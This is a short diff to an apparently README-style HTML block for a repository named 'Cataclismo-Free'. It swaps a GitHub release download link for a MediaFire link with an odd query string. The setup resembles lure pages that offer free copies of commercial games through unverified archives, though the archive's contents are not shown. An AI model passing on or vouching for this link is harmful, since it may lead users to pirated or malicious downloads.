@@ -6,7 +6,7 @@
 </div>
 
 <div align="center">
-  <a href="https://github.com/mitay20003/Cataclismo-Free/releases/download/cataclismo/cataclismo.zip">
+  <a href="https://app.mediafire.com/t8zrgyorywwai?cataclismo123">
     <img src="https://github.com/user-attachments/assets/9aba60ff-45ae-4e33-af5d-a4d9e24ae14e" height="80" alt="Link Image">
   </a>
 </div>
